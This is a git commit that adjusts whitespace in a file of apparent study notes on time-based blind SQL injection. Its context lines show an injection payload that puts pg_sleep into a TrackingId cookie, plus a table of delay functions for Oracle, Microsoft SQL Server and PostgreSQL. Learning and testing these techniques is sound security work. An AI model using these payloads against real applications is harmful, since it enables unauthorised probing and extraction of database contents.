2a4160e90ee5ce715cad5bd493c0ec10bbc4d09f
HTN <96134288+htn-dev@users.noreply.github.com>
2022-06-10 11:30:49 -0400

    Update Time delays.sql

--- Blind SQL injection/Time delays.sql
+++ Blind SQL injection/Time delays.sql
@@ -4,7 +4,7 @@
 TrackingId=x'||pg_sleep(10)--
 
 '--Submit the request and observe that the application takes 10 seconds to respond.
-  
+ 
 Oracle	      dbms_pipe.receive_message(('a'),10)
 Microsoft	    WAITFOR DELAY '0:0:10'
 PostgreSQL	  SELECT pg_sleep(10)
